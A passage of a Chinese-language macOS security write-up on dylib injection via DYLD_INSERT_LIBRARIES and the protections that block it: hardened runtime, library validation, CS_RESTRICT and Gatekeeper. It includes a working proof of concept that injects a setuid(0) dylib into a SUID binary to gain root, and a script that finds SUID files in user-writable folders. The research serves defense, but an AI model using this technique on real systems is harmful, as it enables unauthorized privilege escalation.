    Authority=Apple Root CA
    Signed Time=2019. Jul 9. 11:40:15
    Info.plist=not bound
    TeamIdentifier=33YRLYRBYV
    Sealed Resources=none
    Internal requirements count=1 size=180
    $ /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
    Hello from dylib!
如果我使用另一个证书，那么dylib将无法正常加载，如下所示。需要注意的是，这种验证机制始终存在，并不是Gatekeeper执行的操作。
    $ codesign -f -s "Mac Developer: PI:EMAIL (M9UN3Y3UDG)" inject.dylib 
    inject.dylib: replacing existing signature
    $ codesign -dvvv inject.dylib 
    Executable=inject.dylib
    Identifier=inject
    Format=Mach-O thin (x86_64)
    CodeDirectory v=20200 size=230 flags=0x0(none) hashes=3+2 location=embedded
    Hash type=sha256 size=32
    CandidateCDHash sha256=2a3de5a788d89ef100d1193c492bfddd6042e04c
    Hash choices=sha256
    CDHash=2a3de5a788d89ef100d1193c492bfddd6042e04c
    Signature size=4703
    Authority=Mac Developer: PI:EMAIL (M9UN3Y3UDG)
    Authority=Apple Worldwide Developer Relations Certification Authority
    Authority=Apple Root CA
    Signed Time=2019. Jul 9. 11:43:57
    Info.plist=not bound
    TeamIdentifier=E7Q33VUH49
    Sealed Resources=none
    Internal requirements count=1 size=176
    $ /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
    dyld: warning: could not load inserted library 'inject.dylib' into hardened process because no suitable image found.  Did find:
        inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: mapping process and mapped file (non-platform) have different Team IDs
        inject.dylib: stat() failed with errno=1
有趣的是，即使我在capabilities页面设置了com.apple.security.cs.allow-dyld-environment-variables entitlement，我也无法使用其他签名加载dylib。我不确定我在操作上是否出现了问题。
接下来为应用设置CS_REQUIRE_LV，我们可以在Build Settings -> Signing -> Other Code Signing
Flags中设置-o library。重新编译并检查程序的代码签名后，可以看到该标志已启用：
    $ codesign -dvvv /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
    Executable=/HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa
    (...)
    CodeDirectory v=20200 size=377 flags=0x2000(library-validation) hashes=4+5 location=embedded
    (...)
如果我们尝试使用其他签名来加载dylib，可以得到与hardened runtime相同的错误：
    dyld: warning: could not load inserted library 'inject.dylib' into hardened process because no suitable image found.  Did find:
        inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: mapping process and mapped file (non-platform) have different Team IDs
        inject.dylib: stat() failed with errno=1
最后就是测试CS_RESTRICT标志，但我对这个标志不甚了解，只知道这是App程序特有的标志。如果大家掌握了更多信息，请多多指教。为了验证这个标志，我尝试对某个Apple程序执行注入操作，该程序没有设置前文提到的标志，不是SUID文件，也没有包含RESTRICTED段。有趣的是，codesign工具并不能反应是否存在CS_RESTRICT标志，因此我选择使用Disk
Utility。经过验证发现，我们的dylib的确没有被加载：
    $ codesign -dvvv /Applications/Utilities/Disk\ Utility.app/Contents/MacOS/Disk\ Utility 
    Executable=/Applications/Utilities/Disk Utility.app/Contents/MacOS/Disk Utility
    Identifier=com.apple.DiskUtility
    Format=app bundle with Mach-O thin (x86_64)
    CodeDirectory v=20100 size=8646 flags=0x0(none) hashes=263+5 location=embedded
    Platform identifier=7
    Hash type=sha256 size=32
    CandidateCDHash sha256=2fbbd1e193e5dff4248aadeef196ef181b1adc26
    Hash choices=sha256
    CDHash=2fbbd1e193e5dff4248aadeef196ef181b1adc26
    Signature size=4485
    Authority=Software Signing
    Authority=Apple Code Signing Certification Authority
    Authority=Apple Root CA
    Info.plist entries=28
    TeamIdentifier=not set
    Sealed Resources version=2 rules=13 files=1138
    Internal requirements count=1 size=72
    $ DYLD_INSERT_LIBRARIES=inject.dylib /Applications/Utilities/Disk\ Utility.app/Contents/MacOS/Disk\ Utility
然而如果设置了CS_REQUIRE_LV标志，我们也可以将dylib注入SUID文件中（实际上也可能注入带有CS_RUNTIME标志的文件）。虽然要求dylib使用相同的签名，但这里存在一个潜在的权限提升场景。为了演示方便，我修改了一下dylib：
    #include 
    #include 
    #include 
    __attribute__((constructor))
    static void customConstructor(int argc, const char **argv)
     {
        setuid(0);
        system("id");
        printf("Hello from dylib!\n");
        syslog(LOG_ERR, "Dylib injection successful in %s\n", argv[0]);
    }
执行签名操作，使用相同的证书签名测试程序，对测试程序设置SUID位然后运行。这里可以看到我们能注入dylib，并且能够以root身份运行。
    gcc -dynamiclib inject.c -o inject.dylib
    codesign -f -s "Mac Developer: PI:EMAIL (M9UN3Y3UDG)" inject.dylib
    codesign -f -s "Mac Developer: PI:EMAIL (M9UN3Y3UDG)" -o library test
    sudo chown root test
    sudo chmod +s test
    ls -l test
    -rwsr-sr-x  1 root  staff  26912 Jul  9 14:01 test
    codesign -dvvv test
    Executable=/Users/csaby/Downloads/test
    Identifier=test
    Format=Mach-O thin (x86_64)
    CodeDirectory v=20200 size=228 flags=0x2000(library-validation) hashes=3+2 location=embedded
    Hash type=sha256 size=32
    CandidateCDHash sha256=7d06a7229cbc476270e455cb3ef88bdddf109f12
    Hash choices=sha256
    CDHash=7d06a7229cbc476270e455cb3ef88bdddf109f12
    Signature size=4703
    Authority=Mac Developer: PI:EMAIL (M9UN3Y3UDG)
    Authority=Apple Worldwide Developer Relations Certification Authority
    Authority=Apple Root CA
    Signed Time=2019. Jul 9. 14:01:03
    Info.plist=not bound
    TeamIdentifier=E7Q33VUH49
    Sealed Resources=none
    Internal requirements count=1 size=172
    ./test 
    uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
    Hello from dylib!
    Hello world
从理论上讲，我们需要满足如下任一条件才能利用这种场景：
1、具备原始可执行程序的代码签名证书（这一点基本上不可能完成）；
2、具备设置SUID文件所在目录的写入权限。在这种情况下，我们可以使用自己的证书来签名该文件（codesign会替换我们签名的文件，因此会删除原始文件并创建一个新的文件。这在*nix系统上有可能做到，我们可以通过目录来删除文件，即便这些文件归root所有），等待SUID位被重置，然后最终可以注入自己的dylib。大家可能觉得这种场景不会发生，但我的确找到了一个样例。
如下是用来寻找满足第2种条件的python脚本（主要引用自StackOverflow）：
    #!/usr/bin/python3
    import os
    import getpass
    from pathlib import Path
    binaryPaths = ('/Applications/GNS3/Resources/')
    username = getpass.getuser()
    for binaryPath in binaryPaths:
        for rootDir,subDirs,subFiles in os.walk(binaryPath):
           for subFile in subFiles:
               absPath = os.path.join(rootDir,subFile)
               try:
                  permission = oct(os.stat(absPath).st_mode)[-4:]
                  specialPermission = permission[0]
                  if int(specialPermission) >= 4:
                      p = Path(os.path.abspath(os.path.join(absPath, os.pardir)))
                      if p.owner() == username:
                         print("Potential issue found, owner of parent folder is:", username)
                         print(permission , absPath)
               except:
                  pass
本文最后一个讨论点是GateKeeper。我们可以在Mojave中注入带有隔离标志的二进制文件。
    $ ./test 
    uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
    Hello from dylib!
    Hello world
    $ xattr -l inject.dylib 
    com.apple.metadata:kMDItemWhereFroms:
    00000000  62 70 6C 69 73 74 30 30 A2 01 02 5F 10 22 68 74  |bplist00..._."ht|
    00000010  74 70 3A 2F 2F 31 32 37 2E 30 2E 30 2E 31 3A 38  |tp://127.0.0.1:8|
    00000020  30 38 30 2F 69 6E 6A 65 63 74 2E 64 79 6C 69 62  |080/inject.dylib|
    00000030  5F 10 16 68 74 74 70 3A 2F 2F 31 32 37 2E 30 2E  |_..http://127.0.|
    00000040  30 2E 31 3A 38 30 38 30 2F 08 0B 30 00 00 00 00  |0.1:8080/..0....|
    00000050  00 00 01 01 00 00 00 00 00 00 00 03 00 00 00 00  |................|
    00000060  00 00 00 00 00 00 00 00 00 00 00 49              |...........I|
    0000006c
    com.apple.quarantine: 0081;5d248e35;Chrome;CE4482F1-0AD8-4387-ABF6-C05A4443CAF4
然而这种方法无法适用于Catalina，系统引入了一些改动，因此这一点也非常正常：
我们可以看到类似之前的错误信息：
    dyld: could not load inserted library 'inject.dylib' because no suitable image found.  Did find:
        inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: Library load disallowed by System Policy
        inject.dylib: stat() failed with errno=1
## 0x03 总结
我认为应用程序应该保护自身免受这种注入技术影响，根据本文分析，这种技术防护起来也非常简单，我们可以有各种选项可以使用，因此没理由不采取防护措施。随着Apple对系统的不断改善，大多数/所有应用程序都会启用hardened
runtime，因此我们希望这种注入技术也会随之慢慢消失在历史长河中。如果大家开发的应用设置了SUID位，请确保应用的父目录也设置了正确的权限。
相关代码请参考[Github](https://gist.github.com/theevilbit/3574df063cf9e2c3ba6c57aca5dff022)。